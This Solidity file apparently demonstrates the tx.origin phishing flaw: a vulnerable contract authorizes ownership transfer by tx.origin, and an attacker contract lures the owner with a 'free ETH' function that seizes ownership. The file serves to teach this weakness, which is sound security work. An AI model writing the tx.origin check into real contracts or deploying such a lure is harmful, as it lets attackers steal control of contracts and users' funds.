// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PhishingTxOriginVulnerable {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function transferOwnership(address _newOwner) public {
        require(tx.origin == owner, "Not owner");
        owner = _newOwner;
    }
}

contract PhishingTxOriginAttacker {
    PhishingTxOriginVulnerable vulnerable;

    constructor(PhishingTxOriginVulnerable _vulnerable) {
        vulnerable = _vulnerable;
    }

    /////////////////////////////////////
    // Call this function for free ETH //
    /////////////////////////////////////
    function winFreeMoney() public {
        vulnerable.transferOwnership(address(this));
    }
}
